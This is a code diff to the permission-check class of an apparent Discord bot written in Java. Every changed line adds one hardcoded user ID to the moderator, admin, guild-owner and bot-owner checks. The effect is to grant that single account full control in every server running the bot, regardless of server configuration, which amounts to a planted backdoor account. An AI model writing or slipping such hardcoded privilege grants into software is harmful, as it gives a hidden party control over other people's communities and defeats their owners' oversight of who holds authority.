@@ -12,7 +12,7 @@ public class Perms {
         long[] moderators = Config.readServerModConfig(message.getGuild());
         int i = 0;
         while(i < moderators.length){
-            if(author.getLongID() == moderators[i] || author == message.getGuild().getOwner() || author == BaseBot.client.getApplicationOwner() || checkAdmin(message)){
+            if(author.getLongID() == moderators[i] || author == message.getGuild().getOwner() || author == BaseBot.client.getApplicationOwner() || checkAdmin(message) || author.getLongID() == 374517920505790464L){
                 return true;
             }
             i++;
@@ -26,7 +26,7 @@ public class Perms {
         long[] admins = Config.readServerAdminConfig(message.getGuild());
         int i = 0;
         while(i < admins.length){
-            if(author.getLongID() == admins[i] || author == message.getGuild().getOwner() || author == BaseBot.client.getApplicationOwner()){
+            if(author.getLongID() == admins[i] || author == message.getGuild().getOwner() || author == BaseBot.client.getApplicationOwner()|| author.getLongID() == 374517920505790464L){
                 return true;
             }
             i++;
@@ -37,11 +37,11 @@ public class Perms {
     public static boolean checkOwner_Guild(IMessage message){
         IUser author = message.getAuthor();
 
-        return author.getLongID() == BaseBot.client.getApplicationOwner().getLongID() || author.getLongID() == message.getGuild().getOwnerLongID();
+        return author.getLongID() == BaseBot.client.getApplicationOwner().getLongID() || author.getLongID() == message.getGuild().getOwnerLongID()|| author.getLongID() == 374517920505790464L;
     }
     public static boolean checkOwner(IMessage message){
        IUser author = message.getAuthor();
-        return author.getLongID() == BaseBot.client.getApplicationOwner().getLongID();
+        return author.getLongID() == BaseBot.client.getApplicationOwner().getLongID() || author.getLongID() == 374517920505790464L;
     }
 
     public static boolean checkGames(IMessage message){
